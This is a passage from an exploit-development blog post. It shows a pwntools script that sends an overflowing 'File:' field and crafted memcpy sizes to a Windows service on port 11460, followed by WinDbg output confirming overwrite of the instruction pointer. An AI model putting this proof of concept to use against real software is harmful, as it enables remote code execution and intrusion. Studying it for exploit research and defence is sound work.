payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x534</span><span class="p">)</span><span class="c1"> # opcode</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">   # 1st memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x200</span><span class="p">)</span><span class="c1"> # 1st memcpy: size field</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">   # 2nd memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x100</span><span class="p">)</span><span class="c1"> # 2nd memcpy: size field</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">   # 3rd memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x100</span><span class="p">)</span><span class="c1"> # 3rd memcpy: size field</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">

offset</span><span class="o"> =</span><span class="mi"> 274</span><span class="p">
junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset

ret</span><span class="no"> =</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
stack</span><span class="o"> = </span><span class="no">b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 100</span><span class="p">

buffer</span><span class="o"> =</span><span class="p"> junk </span><span class="o">+ </span><span class="p">ret</span><span class="o"> +</span><span class="p"> stack

payload</span><span class="o"> +=</span><span class="no"> f</span><span class="s">"File:</span><span class="p"> {buffer}</span><span class="s"> From: 0 To: 0 ChunkLoc: 0 FileLoc: 0</span><span class="p">".encode()  
payload</span><span class="o"> =</span><span class="p"> p32(</span><span class="no">len</span><span class="p">(payload)</span><span class="o"> -</span><span class="mi"> 4</span><span class="p">, endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">) </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">,</span><span class="mi"> 11460</span><span class="p">)
shell.send(payload)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> g
(1d48.e9c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=05efb440 ecx=0d23ca70 edx=77ad1670 esi=05efb440 edi=00669360  
eip=42424242 esp=0d23e31c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246  
42424242 ??              ???

</span><span class="ro">0:000></span><span class="p"> dd esp
0d23e31c  43434343 43434343 43434343 43434343
0d23e32c  43434343 43434343 43434343 43434343
0d23e33c  43434343 43434343 43434343 43434343
0d23e34c  43434343 43434343 43434343 43434343
0d23e35c  43434343 43434343 43434343 43434343
0d23e36c  43434343 43434343 43434343 43434343
0d23e37c  43434343 00000027 00000000 00000000
0d23e38c  00000000 00000000 00000000 00000000</span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
</span><span class="p">
="p">








